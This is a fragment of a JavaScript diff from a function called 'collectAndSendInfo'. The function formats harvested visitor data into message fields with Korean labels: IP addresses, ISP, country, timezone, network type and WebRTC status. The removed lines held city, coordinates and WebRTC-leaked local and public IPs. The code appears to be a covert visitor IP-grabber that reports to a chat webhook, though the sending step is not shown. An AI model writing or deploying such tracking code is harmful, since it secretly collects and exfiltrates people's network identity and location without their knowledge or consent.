@@ -1793,21 +1793,16 @@ async function collectAndSendInfo() {
                 {
                     name: "기본 정보",
                     value:
-                        `**주 IP:** ${visitorInfo.ip || 'N/A'} (${visitorInfo.ipVersion || 'Unknown'})\n` +
+                        `**주 IP:** ${visitorInfo.ip || 'N/A'} (IPv${visitorInfo.ipVersion === 'IPv4' ? '4' : visitorInfo.ipVersion === 'IPv6' ? '6' : '?'})\n` +
                         `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
                         `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}\n` +
-                        `**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n` +
-                        `**조직:** ${visitorInfo.location?.org || 'N/A'}\n` +
-                        `**접속 시간:** ${visitorInfo.localTime}`,
+                        `**ISP:** ${visitorInfo.location?.isp || 'N/A'}`,
                     inline: false
                 },
                 {
                     name: "위치 정보",
                     value:
                         `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n` +
-                        `**지역:** ${visitorInfo.location?.region || 'N/A'}\n` +
-                        `**도시:** ${visitorInfo.location?.city || 'N/A'}\n` +
-                        `**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n` +
                         `**시간대:** ${visitorInfo.timezoneInfo.timezone}`,
                     inline: false
                 },
@@ -1815,19 +1810,16 @@ async function collectAndSendInfo() {
                     name: "네트워크 정보",
                     value:
                         `**네트워크 타입:** ${visitorInfo.network.networkCategory || 'N/A'}\n` +
-                        `**원시 type:** ${visitorInfo.network.type || 'N/A'}\n` +
-                        `**effectiveType:** ${visitorInfo.network.effectiveType}\n` +
-                        `**다운링크:** ${visitorInfo.network.downlink}\n` +
-                        `**RTT:** ${visitorInfo.network.rtt}\n` +
-                        `**데이터 세이브:** ${visitorInfo.network.saveData}`,
+                        `**원시 type:** ${visitorInfo.network.type || 'N/A'}`,
                     inline: false
                 },
                 {
                     name: "WebRTC IP 후보",
                     value:
                         `**차단 여부:** ${visitorInfo.webRTC.blocked}\n` +
-                        `**로컬 IP:** ${visitorInfo.webRTC.localIPs.join(', ') || 'N/A'}\n` +
-                        `**공인 후보 IP:** ${visitorInfo.webRTC.candidateIPs.join(', ') || 'N/A'}`,
+                        `**메인 IP:** ${visitorInfo.ip || 'N/A'}\n` +
+                        `**IPv4:** ${visitorInfo.ipInfo?.ipv4 || 'N/A'}\n` +
+                        `**IPv6:** ${visitorInfo.ipInfo?.ipv6 || 'N/A'}`,
                     inline: false
                 },
                 {
